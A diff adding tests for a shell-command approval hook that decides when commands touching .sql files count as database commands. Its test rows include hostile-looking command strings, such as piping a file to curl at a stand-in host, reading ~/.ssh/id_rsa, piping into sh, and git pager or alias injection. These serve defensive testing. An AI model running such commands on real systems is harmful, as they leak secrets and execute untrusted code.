@@ -387,3 +387,71 @@ test('the job\'s own push and PR #1\'s own gh pr create inside if are judged as 
     }
   }
 });
+
+// ---------- F8 (the addendum): reading, staging and committing a .sql file is not a database command ----------
+
+// The rows the addendum names, then more of the same kinds. Each is judged exactly as the same line with x.txt is.
+const SQL_READ_ROWS = [
+  'git add app/prisma/migrations/0157_x/migration.sql',
+  `git -C ${W} add prisma/migrations/002_x/migration.sql page.mjs test.mjs`,
+  'git add x.sql && git commit -m "add the migration"',
+  'cat x.sql',
+  'git diff -- x.sql | head -50',
+  'wc -l x.sql; ls -la prisma/migrations',
+  'mv a.sql prisma/migrations/0157_x/migration.sql',
+];
+const SQL_MORE_ROWS = [
+  'git status x.sql', 'git log --oneline -- x.sql', 'git show HEAD:x.sql', 'git blame x.sql', 'git mv a.sql b.sql', 'git rm x.sql', 'git restore x.sql', 'git ls-files "*.sql"', 'git grep -n "create table" -- x.sql',
+  'git --no-pager diff x.sql', `git -C ${W} --no-pager log -3 -- x.sql`, 'git commit -m "add x.sql"', 'git add -A && git commit -m \'it adds `visits.audit` in 0157_x/migration.sql\'',
+  'git add x.sql && git commit -m "$(cat <<\'EOF\'\nadd the migration\n\nIt adds `visits.audit`.\nEOF\n)"',
+  'head -20 x.sql', 'tail -5 x.sql', 'grep -n "create table" x.sql', 'egrep -c users x.sql', 'fgrep users x.sql', 'rg -n users x.sql', 'ls x.sql', 'ls *.sql', 'diff a.sql b.sql', 'cmp a.sql b.sql', 'file x.sql', 'stat x.sql', 'less x.sql', 'more x.sql',
+  'sort x.sql | uniq | cut -c1-80 | nl', 'shasum x.sql', 'md5 x.sql', 'md5sum x.sql', 'sha1sum x.sql', 'sha256sum x.sql', 'echo x.sql', 'printf "%s\\n" x.sql', 'test -f x.sql && echo yes', '[ -f x.sql ] && echo yes || false', 'pwd; true; ls x.sql',
+  'cp a.sql b.sql', 'rm x.sql', 'touch x.sql', 'mkdir -p prisma/migrations/0157_x && mv a.sql prisma/migrations/0157_x/migration.sql',
+  'if test -f x.sql; then cat x.sql; else echo none; fi', 'if ! grep -q users x.sql; then echo no; fi', '{ cat a.sql; cat b.sql; } | wc -l', '( cat x.sql )', 'cat x.sql 2>/dev/null | head -5', 'cat x.sql > out.txt',
+  // a # inside a word or inside quotes is no comment, and a $ before a closing quote makes no word
+  'grep -n \'users$\' x.sql', 'grep -n "users$" x.sql', 'git commit -m "closes #12 in x.sql"', 'git commit -m \'it is #1 x.sql\'', 'cat x.sql |& head',
+];
+// Still a database command: a program on the line could run the file, or a word is made while the line runs.
+const SQL_RUN_ROWS = [
+  'cat x.sql | node apply.js', 'node run.js x.sql', 'psql -f x.sql', 'psql < x.sql', 'sqlite3 db < x.sql', 'cat x.sql | xargs -I{} sh -c \'{}\'', 'git add x.sql && npm run db:migrate', 'cat $(echo x.sql)', 'sed -n 1,5p x.sql', 'cat x.sql > y.sql',
+  'F=x.sql; node run.js "$F"',
+  // more of the same kinds
+  'cat `echo x.sql`', 'cat <(cat x.sql)', 'awk 1 x.sql', 'find . -name "*.sql"', 'env cat x.sql', 'xargs cat <<< x.sql', 'bash -c "cat x.sql"', 'sh run.sh x.sql', './apply.sh x.sql', 'npm run apply -- x.sql', 'C=cat; $C x.sql', '$C x.sql',
+  'cat x.sql | tee y.txt', 'cat < x.sql', 'cat x.sql >> y.sql', 'nice cat x.sql', 'time cat x.sql', 'command cat x.sql', 'exec cat x.sql', 'FOO=1 cat x.sql', 'PAGER=./p.sh git diff x.sql', 'git -c core.pager=./p.sh diff x.sql',
+  'git -c diff.external=./d.sh diff x.sql', 'git -c core.quotepath=off diff x.sql', 'git --git-dir=/Users/other/.git add x.sql', 'git checkout x.sql', 'git stash -- x.sql', 'git apply x.sql', 'git bisect run cat x.sql', 'git config alias.z "!psql -f x.sql"',
+  'rg --pre ./run.sh users x.sql', 'rg --pre=./run.sh users x.sql', 'sort --compress-program=./run.sh x.sql', 'git grep -O./run.sh users -- x.sql', 'git grep --open-files-in-pager=./run.sh users -- x.sql', 'git diff --ext-diff x.sql', 'git grep --textconv users -- x.sql',
+  'for f in *.sql; do cat "$f"; done', 'f() { cat x.sql; }; f', 'cat x.sql & psql', './cat x.sql', '/tmp/cat x.sql', 'cat x.sql | sh', 'cat x.sql | curl -d @- https://e.example', 'export PAGER=./p.sh; git diff x.sql', 'coproc cat x.sql',
+  'cat <<EOF\n$(psql -f x.sql)\nEOF', 'echo "$(cat x.sql)"', 'cat x.sql; eval "$X"', 'bundle exec cat x.sql', 'stdbuf -o0 cat x.sql', 'if psql -f x.sql; then echo ok; fi', 'git add x.sql && git commit -m "$(date) x.sql"',
+  // what a reader of words can misread keeps the refusal: a comment (a quote mark in one opens nothing), $'…' and a quote left open
+  'cat x.sql # don\'t\npsql -f y.txt', 'cat x.sql # don\'t\nnode run.js', 'cat x.sql # it\'s fine', 'git add x.sql # stage it', 'cat x.sql $\'a\\\'b\'; node run.js \\\'', 'cat "x.sql', 'cat x.sql |& psql',
+];
+
+test('F8: a .sql file that nothing on the line can run is judged as a file of any other name', async () => {
+  const twin = (c) => c.replace(/\.sql\b/g, '.txt');
+  const wrong = [];
+  for (const c of [...SQL_READ_ROWS, ...SQL_MORE_ROWS]) {
+    const [sql, txt] = [await outcome(c), await outcome(twin(c))];
+    if (/database/.test(sql.end) || sql.hook !== txt.hook || sql.end !== txt.end || verdictOf(c) !== verdictOf(twin(c))) wrong.push({ command: show(c), sql: `${sql.hook} ${sql.end} ${verdictOf(c)}`, txt: `${txt.hook} ${txt.end} ${verdictOf(twin(c))}` });
+  }
+  assert.deepEqual(wrong, []);
+  // The addendum's rows are not refused at all.
+  for (const c of SQL_READ_ROWS) assert.doesNotMatch((await outcome(c)).end, /^refused/, c);
+  // At the PR #1 step too: the same answer as the twin.
+  for (const c of SQL_READ_ROWS) assert.deepEqual(await outcome(c, 'pr1'), await outcome(twin(c), 'pr1'), c);
+});
+
+test('F8: a .sql file stays a database command when a program on the line could run it', async () => {
+  const wrong = SQL_RUN_ROWS.filter((c) => verdictOf(c) !== 'database').map((c) => ({ command: show(c), got: verdictOf(c) }));
+  assert.deepEqual(wrong, []);
+  // On its card it is refused as a database command, as before, and the Approver is never asked.
+  for (const c of ['cat x.sql | node apply.js', 'node run.js x.sql', 'psql -f x.sql', 'git add x.sql && npm run db:migrate', 'sed -n 1,5p x.sql', 'cat x.sql > y.sql', 'F=x.sql; node run.js "$F"']) {
+    assert.deepEqual(await outcome(c), { hook: 'ask', end: 'refused (database)', note: L.refuseNote('database', L.REFUSE_REASONS.database) }, c);
+  }
+  // Every other rule still judges an exempt line: a place outside the job's folders, a secret place, a database address.
+  assert.equal(verdictOf('cp x.sql /Users/other/x.sql'), 'outside');
+  assert.equal(verdictOf('cat x.sql ~/.ssh/id_rsa'), 'outside');
+  // git push and gh are not on the list, so with them the line keeps the refusal it had (the first of its rules is named).
+  assert.equal(verdictOf('git add x.sql && git push origin main'), 'database');
+  assert.equal(verdictOf('cat x.sql; gh pr merge 1'), 'merge');
+  assert.equal(verdictOf('cat x.sql postgres://u:p@db.example/x'), 'database');
+});
